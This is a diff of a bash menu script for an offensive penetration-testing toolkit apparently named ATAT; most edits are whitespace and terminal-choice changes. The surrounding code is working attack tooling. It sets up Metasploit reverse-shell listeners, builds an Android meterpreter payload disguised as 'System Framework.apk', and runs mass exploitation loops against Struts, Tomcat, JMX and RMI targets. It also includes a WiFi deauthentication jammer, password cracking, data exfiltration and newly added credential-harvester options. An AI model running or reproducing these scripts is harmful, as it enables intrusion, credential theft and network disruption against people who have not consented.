@@ -213,7 +213,7 @@ case "$options" in
 
   "1" | "1" )
   # Accept upper or lowercase input.
-  echo -e "\E[1;34m::::: \e[97mChoose Your Weapon\E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mChoose Your Weapon \E[1;34m:::::"
 
 PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
 options=("Windows" "Linux" "Mac" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
@@ -285,14 +285,15 @@ done
  ;;
 
   "2" | "2" )
-echo -e "\E[1;34m::::: \e[97mCreate a Listener\E[1;34m:::::"
-
-PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
-options=("Options" "Main Menu" "Quit")
+echo -e "\E[1;34m::::: \e[97mCreate a Listener \E[1;34m:::::"
+echo ""
+echo -e "\E[1;34m::::: \e[97mChoose XTerm If You Are Not Sure Which Terminal You Have \E[1;34m:::::"
+PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
+options=("XTerm" "Mate-Terminal" "Gnome-Terminal" "Xfce4" "LXTerminal" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
-        "Options")
+        "XTerm")
         read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
             touch ~/Desktop/temp/meterpreter.rc
             echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
@@ -304,7 +305,55 @@ do
 #           echo set AutoRunScript /root/ATAT/ATAT_multi_post.rc >> ~/Desktop/temp/meterpreter.rc
             echo exploit -j >> ~/Desktop/temp/meterpreter.rc
             cat ~/Desktop/temp/meterpreter.rc
-            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
+            xterm -e msfconsole -q -r ~/Desktop/temp/meterpreter.rc &
+            ;;
+        "Mate-Terminal")
+        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
+            touch ~/Desktop/temp/meterpreter1.rc
+            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter1.rc
+            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter1.rc
+            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter1.rc
+            echo set LPORT $userport >> ~/Desktop/temp/meterpreter1.rc
+            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter1.rc
+            echo exploit -j >> ~/Desktop/temp/meterpreter1.rc
+            cat ~/Desktop/temp/meterpreter1.rc
+            mate-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter1.rc\""
+            ;;
+        "Gnome-Terminal")
+        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
+            touch ~/Desktop/temp/meterpreter2.rc
+            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter2.rc
+            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter2.rc
+            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter2.rc
+            echo set LPORT $userport >> ~/Desktop/temp/meterpreter2.rc
+            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter2.rc
+            echo exploit -j >> ~/Desktop/temp/meterpreter2.rc
+            cat ~/Desktop/temp/meterpreter2.rc
+            gnome-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter2.rc\""
+            ;;
+        "Xfce4")
+        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
+            touch ~/Desktop/temp/meterpreter3.rc
+            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter3.rc
+            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter3.rc
+            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter3.rc
+            echo set LPORT $userport >> ~/Desktop/temp/meterpreter3.rc
+            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter3.rc
+            echo exploit -j >> ~/Desktop/temp/meterpreter3.rc
+            cat ~/Desktop/temp/meterpreter3.rc
+            xfce4-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter3.rc\""
+            ;;
+        "LXTerminal")
+        read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
+            touch ~/Desktop/temp/meterpreter4.rc
+            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter4.rc
+            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter4.rc
+            echo set LHOST 0.0.0.0 >> ~/Desktop/temp/meterpreter4.rc
+            echo set LPORT $userport >> ~/Desktop/temp/meterpreter4.rc
+            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter4.rc
+            echo exploit -j >> ~/Desktop/temp/meterpreter4.rc
+            cat ~/Desktop/temp/meterpreter4.rc
+            lxterminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter4.rc\""
             ;;
         "Main Menu")
             ~/ATAT/ATAT.sh
@@ -595,8 +644,8 @@ do
 			msfvenom -f raw -p android/meterpreter/reverse_https LHOST=$userhost LPORT=$userport -o "System Framework.jar"
 			cp "System Framework.jar" "System Framework.apk"
 			rm "System Framework.jar"
-			echo -e "\E[1;34m::::: \e[97mSystem Framework.apk saved to ~/ATAT. Upload to device, install, and run.\E[1;34m:::::" 
-			echo -e "\E[1;34m::::: \e[97mStart an android/meterpreter/reverse_https listener\E[1;34m:::::" 
+			echo -e "\E[1;34m::::: \e[97mSystem Framework.apk saved to ~/ATAT. Upload to device, install, and run. \E[1;34m:::::" 
+			echo -e "\E[1;34m::::: \e[97mStart an android/meterpreter/reverse_https listener \E[1;34m:::::" 
             ;; 
         "Main Menu")
             ~/ATAT/ATAT.sh
@@ -613,15 +662,15 @@ done
   # 
   echo -e "\E[1;34m::::: \e[97mArmitage Launcher \E[1;34m:::::"
   echo "armitage should be in /opt/armitage"
-  echo -e "\E[1;34m::::: \e[97mLaunching...\E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mLaunching... \E[1;34m:::::"
   armitage 
 
 ;;
 
  "6" | "6" )
          
- echo -e "\E[1;34m::::: \e[97mExploit All The Things!!\E[1;34m:::::"
- echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mExploit All The Things!! \E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
  
 PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
 options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Main Menu" "Quit")
@@ -643,12 +692,12 @@ do
 	run;\
 	exit"
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
             ;;
     "Mulit-Port")
-    echo -e "\E[1;34m::::: \e[97mExploit All The Ports!!\E[1;34m:::::"
-    echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mExploit All The Ports!! \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
             read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set RHOST: ' usertarget;
 	inputfile=~/ATAT/MSF_target_ports.txt
 
@@ -664,12 +713,12 @@ do
 	run;\
 	exit"
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
             ;;
     "Multi-Target Struts")
-    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Struts!!\E[1;34m:::::"
-	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Struts!! \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
             read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set TARGETURI: ' useruri;
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
@@ -686,12 +735,12 @@ do
 	run;\
 	exit"
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Apache Struts Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Apache Struts Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
             ;;
     "Multi-Target Tomcat")
-    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Tomcat!!\E[1;34m:::::"
-	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Tomcat!! \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
             read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HttpPassword: (Blank if none)' userpassword; read -p 'Set HttpUsername: (Blank if none)' userusername;
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
@@ -709,12 +758,12 @@ do
 	run;\
 	exit"
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Apache Tomcat Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Apache Tomcat Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
             ;;     
     "Multi-Target Java JMX")
-    echo -e "\E[1;34m::::: \e[97mExploit All The Java JMX!!\E[1;34m:::::"
-	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mExploit All The Java JMX!! \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
             read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set JMXRMI: ' userjmxrmi;
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
@@ -731,12 +780,12 @@ do
 	run;\
 	exit"
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Java JMX Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Java JMX Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
             ;;
     "Multi-Target Java RMI")
-    echo -e "\E[1;34m::::: \e[97mExploit All The Java RMI!!\E[1;34m:::::"
-	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mExploit All The Java RMI!! \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
             read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HTTPDELAY: (default 10) ' userdelay;
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
@@ -753,8 +802,8 @@ do
 	run;\
 	exit"
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Java RMI Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"        
+            echo -e "\E[1;34m::::: \e[97mAll Java RMI Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
             ;;            
         "Main Menu")
             ~/ATAT/ATAT.sh
@@ -770,7 +819,7 @@ done
 
  "7" | "7" )
          
-echo -e "\E[1;34m::::: \e[97mScan All The Things!!\E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mScan All The Things!! \E[1;34m:::::"
 
 PS3='Enter your choice: ENTER=Options Menu | 10=Main Menu | 11=QUIT: '
 options=("Multi-Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Multi-Target SSLScan - With Masscan Results" "Multi-Target SSLScan - With Nmap Results" "Multi-Target Masscan of All TCP Ports" "Bloodhound" "Extract All IP:Port Combos From Nmap Output For SSLScan Processing" "Main Menu" "Quit")
@@ -790,10 +839,10 @@ do
 	run;\
 	exit"
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned \E[1;34m:::::"
             ;;
     "Multi-Target SNMP Enumeration")
-    echo -e "\E[1;34m::::: \e[97mDump All The SNMP!!\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mDump All The SNMP!! \E[1;34m:::::"
             read -p 'Set RPORT (default=161): ' targetport; read -p 'Set Community String (default=public): ' userstring; read -p 'Set SNMP Version (default=1): ' userversion;
 	inputfile=~/ATAT/MSF_targets.txt
 	for IP in $(cat $inputfile)
@@ -806,10 +855,10 @@ do
 	run;\
 	exit" | tee -a ~/ATAT/SNMP_logs.txt
 	done
-            echo -e "\E[1;34m::::: \e[97mAll Targets' SNMP Have Been Enumerated!\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Targets' SNMP Have Been Enumerated! \E[1;34m:::::"
             ;;
      "Multi-Target Load Balancer Detection")
-	echo -e "\E[1;34m::::: \e[97mMulti-Target Load Balancer Detection\E[1;34m:::::"		
+	echo -e "\E[1;34m::::: \e[97mMulti-Target Load Balancer Detection \E[1;34m:::::"		
 	inputfile=~/ATAT/MSF_targets.txt
 	outputfile=~LBD_Results_temp.txt
 	for IP in $(cat $inputfile)
@@ -818,10 +867,10 @@ do
 	cat $outputfile >> LBD_Results.txt
 	done
 	rm $outputfile
-            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Processed!\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Processed! \E[1;34m:::::"
             ;;
     "Multi-Target SSLScan")
-	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan\E[1;34m:::::"		
+	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan \E[1;34m:::::"		
 	inputfile=~/ATAT/MSF_targets.txt
 	outputfile=SSLScan_Results.txt
 	for IP in $(cat $inputfile)
@@ -836,10 +885,10 @@ do
 	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
 	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
 	done
-                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results!\E[1;34m:::::"
+                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results! \E[1;34m:::::"
             ;;
     "Multi-Target SSLScan - With Masscan Results")
-	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan\E[1;34m:::::"		
+	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan \E[1;34m:::::"		
 	inputfile=~SSLScan_masscan_results.txt
 	outputfile=~SSLScan_Results.txt
 	for IP in $(cat $inputfile)
@@ -854,10 +903,10 @@ do
 	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
 	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
 	done
-                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results!\E[1;34m:::::"
+                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results! \E[1;34m:::::"
             ;;
     "Multi-Target SSLScan - With Nmap Results")
-	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan\E[1;34m:::::"		
+	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan \E[1;34m:::::"		
 	inputfile=SSLScan_nmap_results.txt
 	outputfile=~SSLScan_Results.txt
 	for IP in $(cat $inputfile)
@@ -872,10 +921,10 @@ do
 	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
 	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
 	done
-                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results!\E[1;34m:::::"
+                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results! \E[1;34m:::::"
             ;;
     "Multi-Target Masscan of All TCP Ports")
- echo -e "\E[1;34m::::: \e[97mMasscan All TCP Ports\E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mMasscan All TCP Ports \E[1;34m:::::"
  
 PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
 options=("Run" "Options (enter manual targets for pause/resume support)" "Resume" "Main Menu" "Quit")
@@ -895,7 +944,7 @@ select opt in "${options[@]}"
 	sed "/ /s/ /""/g" ~masscan_results3.txt >> ~SSLScan_masscan_results.txt
 	rm ~masscan_results*.txt
 	done
-            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned!\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned! \E[1;34m:::::"
             ;;
         "Options (enter manual targets for pause/resume support)")
 	outputfile=~masscan_results.txt
@@ -907,7 +956,7 @@ select opt in "${options[@]}"
 	sed "/tcp on /s/tcp on /""/g" ~masscan_results2.txt >> ~masscan_results3.txt
 	sed "/ /s/ /""/g" ~masscan_results3.txt >> ~SSLScan_masscan_results.txt
 	rm ~masscan_results*.txt
-            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned!\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned! \E[1;34m:::::"
             ;;
         "Resume")
     masscan --resume paused.conf
@@ -928,17 +977,17 @@ select opt in "${options[@]}"
         xterm -e bloodhound &
         sleep 30
         firefox http://localhost:7474 &
-			echo -e "\E[1;34m::::: \e[97mIn Firefox Interface\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mLogin to Neo4j Console With User:neo4j & Password:neo4j and Change Defalt Password\E[1;34m:::::"
+			echo -e "\E[1;34m::::: \e[97mIn Firefox Interface \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mLogin to Neo4j Console With User:neo4j & Password:neo4j and Change Defalt Password \E[1;34m:::::"
             echo ""
-            echo -e "\E[1;34m::::: \e[97mIn Bloodhound Interface\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter bolt://127.0.0.1:7687 in Database Field\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter neo4j In Username Field\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter Newly Created Password In Password Field Unless You Left It As Defalut Of neo4j\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mIn Bloodhound Interface \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter bolt://127.0.0.1:7687 in Database Field \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter neo4j In Username Field \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter Newly Created Password In Password Field Unless You Left It As Defalut Of neo4j \E[1;34m:::::"
             echo ""
-            echo -e "\E[1;34m::::: \e[97mCheck Empire & DeathStar Menu For \"Execute Bloodhound Data Collection\" Option To Automate Bloodhound Data Collection Once A PSE Agent Is Active On Your Target\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mCheck Empire & DeathStar Menu For \"Execute Bloodhound Data Collection\" Option To Automate Bloodhound Data Collection Once A PSE Agent Is Active On Your Target \E[1;34m:::::"
             echo ""
-            echo -e "\E[1;34m::::: \e[97mThe neo4j Firefox Interface Does Not Need To Remain Open\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mThe neo4j Firefox Interface Does Not Need To Remain Open \E[1;34m:::::"
             #echo ""
             #echo -e "\E[1;34m::::: \e[97m***To Make neo4j Accept Connections Remotely You Must Make The Following Edits**\E[1;34m:::::"
             #echo -e "\E[1;34m::::: \e[97m***THIS ONLY NEEDS TO BE DONE ONCE!***\E[1;34m:::::"
@@ -947,7 +996,7 @@ select opt in "${options[@]}"
 			#echo -e "\E[1;34m::::: \e[97mThen Save /usr/share/neo4j/conf/neo4j.conf, Kill The 2 xterm Windows Opened By Running This Option & Re-Run This Option Again\E[1;34m:::::"
 			;;
 	"Extract All IP:Port Combos From Nmap Output For SSLScan Processing")
-	        echo -e "\E[1;34m::::: \e[97mNmap Output From \"Intense\" Scan Profiles Only\E[1;34m:::::"
+	        echo -e "\E[1;34m::::: \e[97mNmap Output From \"Intense\" Scan Profiles Only \E[1;34m:::::"
 	read -p 'Enter Full Path Including File Name Of Nmap Output (/root/output.xml):' useroutput;
 	#cat $useroutput | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
 	sed "/Discovered open port /s/Discovered open port /""/g" $useroutput > ~nmap_results1.txt
@@ -956,7 +1005,7 @@ select opt in "${options[@]}"
 	sed "/ /s/ /""/g" ~nmap_results3.txt >> ~nmap_results4.txt
 	grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}' ~nmap_results4.txt >> SSLScan_nmap_results.txt
 	rm ~nmap_results*.txt
-            echo -e "\E[1;34m::::: \e[97mNmap Output Has Been Processed. Results Are In ~/ATAT/SSLScan_nmap_results.txt\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mNmap Output Has Been Processed. Results Are In ~/ATAT/SSLScan_nmap_results.txt \E[1;34m:::::"
             ;;
     "Main Menu")
             ~/ATAT/ATAT.sh
@@ -972,8 +1021,8 @@ done
   
 "8" | "8" )
   # Accept upper or lowercase input.
-  echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"
-  echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!\E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mCheck for Dependencies \E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!! \E[1;34m:::::"
 
 PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
 options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "Apt Update Fix" "Main Menu" "Quit") #"HostAPD-WPE via Github"
@@ -1390,24 +1439,24 @@ do
 	cat ~/ATAT/asleap_output.txt >> ~/ATAT/asleap_cracked.txt
 	rm ~/ATAT/asleap_output.txt
 	done
-	        echo -e "\E[1;34m::::: \e[97mAsleap Output & All Cracked Passwords Located in ~/ATAT/asleap_cracked.txt\E[1;34m:::::"
+	        echo -e "\E[1;34m::::: \e[97mAsleap Output & All Cracked Passwords Located in ~/ATAT/asleap_cracked.txt \E[1;34m:::::"
             ;;
 		"Multi-Target John The Ripper Attack")
     read -p 'Set Path To Wordlist: ' wordlist;
-    echo -e "\E[1;34m::::: \e[97mCracking Passwords!!\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mCracking Passwords!! \E[1;34m:::::"
     inputfile=~/ATAT/john_users.txt
 	john --wordlist $wordlist $inputfile | tee  ~/ATAT/john_output.txt
 	cat ~/ATAT/john_output.txt >> ~/ATAT/john_cracked.txt
 	rm ~/ATAT/john_output.txt
 	john --show ~/ATAT/john_users.txt | tee ~/ATAT/john_cracked.txt
-	        echo -e "\E[1;34m::::: \e[97mJohn The Ripper Output & All Cracked Passwords Located in ~/ATAT/john_cracked.txt\E[1;34m:::::"
+	        echo -e "\E[1;34m::::: \e[97mJohn The Ripper Output & All Cracked Passwords Located in ~/ATAT/john_cracked.txt \E[1;34m:::::"
             ;;  
         "WiFi Jammer")
     read -p 'Set Blast Raduis: ' usertargets;
-    echo -e "\E[1;34m::::: \e[97mDeauth Attack - Automatically Detects ALL Access Points & Clients In Range\E[1;34m:::::"
-    echo -e "\E[1;34m::::: \e[97mThis Attack Will Hold Down the \E[1;34m"$usertargets"\E[1;34m Closest Clients Indefinitely\E[1;34m:::::"
-    echo -e "\E[1;34m::::: \e[97mThis Attack Is ILLEGAL If Not Conducted In A Controlled Environment That Is Free Of Networks That Are Not In Scope!! Use Responsibly & With Great Caution!\E[1;34m:::::"
-    echo -e "\E[1;34m::::: \e[97mUse Ctrl+C In Jammer Window to Stop Attack\E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mDeauth Attack - Automatically Detects ALL Access Points & Clients In Range \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mThis Attack Will Hold Down the \E[1;34m"$usertargets"\E[1;34m Closest Clients Indefinitely \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mThis Attack Is ILLEGAL If Not Conducted In A Controlled Environment That Is Free Of Networks That Are Not In Scope!! Use Responsibly & With Great Caution! \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mUse Ctrl+C In Jammer Window to Stop Attack \E[1;34m:::::"
 	python ~/wifijammer-ng/wifijammer.py -m $usertargets -p 15
             ;;                 
         "Main Menu")
@@ -1424,10 +1473,10 @@ done
 
  "11" | "11" )
          
- echo -e "\E[1;34m::::: \e[97mData Exfiltration\E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mData Exfiltration \E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
-options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
+options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1437,10 +1486,7 @@ do
 		    ;;
 		"Data Exfiltration")	
 	read -p 'Enter Remote File On Target Including Full Path (C:\\\\\Users\\\\\Profile\\\\\filename.ext): ' remoteuserfile; read -p 'Enter File Destination Full Path on Local Machine for MSF (/root/file.ext): ' msflocaluserpath; #read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Local Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
